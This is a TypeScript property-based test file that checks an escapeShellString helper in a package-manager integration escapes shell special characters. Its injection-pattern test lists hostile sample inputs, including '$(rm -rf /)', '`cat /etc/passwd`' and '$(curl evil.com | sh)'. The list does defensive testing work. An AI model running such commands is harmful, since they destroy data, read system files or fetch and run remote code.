import { describe, it, expect } from 'vitest';
import * as fc from 'fast-check';
import { escapeShellString } from '@/lib/scripts/shared';

/**
 * Feature: package-manager-integration, Property 8: Shell character escaping
 * **Validates: Requirements 4.5**
 *
 * Property: For any string containing shell special characters ($, `, ", \, !),
 * the `escapeShellString` function SHALL return a string where all special
 * characters are properly escaped, preventing shell injection.
 */
describe('Feature: package-manager-integration, Property 8: Shell character escaping', () => {
  // Shell special characters that must be escaped
  const dangerousChars = ['$', '`', '"', '\\', '!'];

  /**
   * Property: All dangerous shell characters are escaped
   * For any string, all occurrences of dangerous characters in the output
   * must be preceded by a backslash escape character.
   *
   * Special handling for backslash: since backslash is both a dangerous char
   * AND the escape character, we verify that backslashes appear in pairs
   * (each original backslash becomes \\).
   */
  it('escapes all dangerous shell characters', () => {
    // Non-backslash dangerous characters
    const nonBackslashDangerous = ['$', '`', '"', '!'];

    fc.assert(
      fc.property(fc.string(), (input: string) => {
        const escaped = escapeShellString(input);

        // For non-backslash dangerous characters, verify they're escaped
        for (const char of nonBackslashDangerous) {
          if (input.includes(char)) {
            // Check that no unescaped dangerous characters remain
            for (let i = 0; i < escaped.length; i++) {
              if (escaped[i] === char) {
                // Check if this character is escaped (preceded by odd number of backslashes)
                let backslashCount = 0;
                let j = i - 1;
                while (j >= 0 && escaped[j] === '\\') {
                  backslashCount++;
                  j--;
                }
                // Character is escaped if preceded by odd number of backslashes
                if (backslashCount % 2 === 0) {
                  return false; // Found unescaped dangerous character
                }
              }
            }
          }
        }

        // For backslashes: count in input and verify output has double
        const inputBackslashCount = (input.match(/\\/g) || []).length;
        const escapedBackslashCount = (escaped.match(/\\/g) || []).length;

        // Each input backslash should become two backslashes in output
        // Plus one backslash for each non-backslash dangerous char
        const nonBackslashDangerousCount = nonBackslashDangerous.reduce(
          (count, char) => count + (input.match(new RegExp('\\' + char, 'g')) || []).length,
          0
        );

        const expectedBackslashes = inputBackslashCount * 2 + nonBackslashDangerousCount;
        return escapedBackslashCount === expectedBackslashes;
      }),
      { numRuns: 100 }
    );
  });

  /**
   * Property: Non-dangerous characters are preserved
   * For any string containing only safe characters (alphanumeric, spaces, etc.),
   * the output should equal the input.
   */
  it('preserves non-dangerous characters', () => {
    // Generate strings with only safe characters using constantFrom
    const safeChars =
      'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_./';
    const safeCharArb = fc.string({
      unit: fc.constantFrom(...safeChars.split('')),
    });

    fc.assert(
      fc.property(safeCharArb, (input: string) => {
        const escaped = escapeShellString(input);
        return escaped === input;
      }),
      { numRuns: 100 }
    );
  });

  /**
   * Property: Safe strings remain unchanged after escaping
   * Applying escape to a string with only safe characters should return
   * the same string unchanged.
   */
  it('safe strings remain unchanged after escaping', () => {
    const safeChars =
      'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_./';
    const safeStringArb = fc.string({
      unit: fc.constantFrom(...safeChars.split('')),
    });

    fc.assert(
      fc.property(safeStringArb, (input: string) => {
        const escaped = escapeShellString(input);
        return escaped === input;
      }),
      { numRuns: 100 }
    );
  });

  /**
   * Property: Each dangerous character is escaped exactly once per occurrence
   * The escaped string should have the same "semantic" content, just with
   * escape characters added.
   */
  it('each dangerous character occurrence is escaped exactly once', () => {
    fc.assert(
      fc.property(fc.string(), (input: string) => {
        const escaped = escapeShellString(input);

        // Count dangerous chars in input
        let dangerousCount = 0;
        for (const char of input) {
          if (dangerousChars.includes(char)) {
            dangerousCount++;
          }
        }

        // The escaped string should be longer by exactly the number of dangerous chars
        // (each dangerous char gets one backslash added)
        const expectedLength = input.length + dangerousCount;

        return escaped.length === expectedLength;
      }),
      { numRuns: 100 }
    );
  });

  /**
   * Property: Strings with shell injection patterns are neutralized
   * Common shell injection patterns should be safely escaped.
   */
  it('neutralizes shell injection patterns', () => {
    // Generate strings that include common injection patterns
    const injectionPatterns = [
      '$(command)',
      '`command`',
      '"quoted"',
      '\\escaped',
      '!history',
      '$(rm -rf /)',
      '`cat /etc/passwd`',
      '"$(whoami)"',
      '${PATH}',
      '$(curl evil.com | sh)',
    ];

    fc.assert(
      fc.property(fc.constantFrom(...injectionPatterns), (input: string) => {
        const escaped = escapeShellString(input);

        // Verify no unescaped command substitution patterns
        // $( should become \$(
        if (input.includes('$(')) {
          if (!escaped.includes('\\$(')) {
            return false;
          }
        }

        // ` should become \`
        if (input.includes('`')) {
          // Check all backticks are escaped
          for (let i = 0; i < escaped.length; i++) {
            if (escaped[i] === '`') {
              let backslashCount = 0;
              let j = i - 1;
              while (j >= 0 && escaped[j] === '\\') {
                backslashCount++;
                j--;
              }
              if (backslashCount % 2 === 0) {
                return false;
              }
            }
          }
        }

        return true;
      }),
      { numRuns: 100 }
    );
  });

  // Unit tests for specific edge cases
  describe('specific escape cases', () => {
    it('escapes dollar sign for variable expansion prevention', () => {
      expect(escapeShellString('$HOME')).toBe('\\$HOME');
      expect(escapeShellString('${PATH}')).toBe('\\${PATH}');
    });

    it('escapes backticks for command substitution prevention', () => {
      expect(escapeShellString('`whoami`')).toBe('\\`whoami\\`');
    });

    it('escapes double quotes', () => {
      expect(escapeShellString('"hello"')).toBe('\\"hello\\"');
    });

    it('escapes backslashes', () => {
      expect(escapeShellString('path\\to\\file')).toBe('path\\\\to\\\\file');
    });

    it('escapes exclamation marks for history expansion prevention', () => {
      expect(escapeShellString('!!')).toBe('\\!\\!');
      expect(escapeShellString('!$')).toBe('\\!\\$');
    });

    it('handles empty string', () => {
      expect(escapeShellString('')).toBe('');
    });

    it('handles string with all dangerous characters', () => {
      const input = '$`"\\!';
      const escaped = escapeShellString(input);
      expect(escaped).toBe('\\$\\`\\"\\\\\\!');
    });

    it('handles mixed safe and dangerous characters', () => {
      expect(escapeShellString('hello$world')).toBe('hello\\$world');
      expect(escapeShellString('test`cmd`end')).toBe('test\\`cmd\\`end');
    });

    it('handles multiple consecutive dangerous characters', () => {
      expect(escapeShellString('$$')).toBe('\\$\\$');
      expect(escapeShellString('````')).toBe('\\`\\`\\`\\`');
    });

    it('handles real-world package names safely', () => {
      // Package names should typically be safe, but test edge cases
      expect(escapeShellString('package-name')).toBe('package-name');
      expect(escapeShellString('org.example.app')).toBe('org.example.app');
      expect(escapeShellString('app@1.0.0')).toBe('app@1.0.0');
    });
  });
});
